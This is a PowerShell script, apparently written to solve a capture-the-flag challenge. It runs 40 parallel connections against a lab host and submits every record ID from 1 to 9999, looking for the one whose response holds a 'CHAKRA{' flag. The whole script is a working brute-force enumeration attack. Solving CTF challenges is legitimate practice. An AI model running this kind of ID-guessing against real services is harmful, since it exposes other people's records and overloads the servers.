$pool = [RunspaceFactory]::CreateRunspacePool(1, 40)
$pool.Open()
$jobs = New-Object System.Collections.Generic.List[object]

$sbText = @'
param($xid)
try {
    $c = New-Object System.Net.Sockets.TcpClient("lab.hexnova.space", 30761)
    $s = $c.GetStream()
    $r = New-Object System.IO.StreamReader($s)
    $w = New-Object System.IO.StreamWriter($s)
    $w.AutoFlush = $true
    $s.ReadTimeout = 3000
    try { while($true){ $l=$r.ReadLine(); if($l -match "record id"){break} } } catch{}
    $w.WriteLine($xid)
    Start-Sleep -Milliseconds 400
    $out = ""
    $s.ReadTimeout = 1000
    try { while($true){ $l=$r.ReadLine(); if($l -eq $null){break}; $out = $out + $l + " " } } catch{}
    $c.Close()
    if($out -match "CHAKRA\{") { return ("FOUND " + $xid + " " + $out) }
    return $null
} catch { return $null }
'@

$sb = [scriptblock]::Create($sbText)

foreach ($id in 1..9999) {
    $ps = [PowerShell]::Create()
    $ps.RunspacePool = $pool
    $null = $ps.AddScript($sb).AddArgument($id)
    $h = $ps.BeginInvoke()
    $jobs.Add([PSCustomObject]@{ PS=$ps; H=$h; ID=$id })
}

Write-Host ("Launched " + $jobs.Count + " jobs")

$found = $false
foreach ($job in $jobs) {
    $result = $job.PS.EndInvoke($job.H)
    if ($result) {
        Write-Host ("=== FLAG FOUND: " + $result + " ===")
        $found = $true
        break
    }
    $job.PS.Dispose()
}
if (-not $found) { Write-Host "Not found" }
$pool.Close()
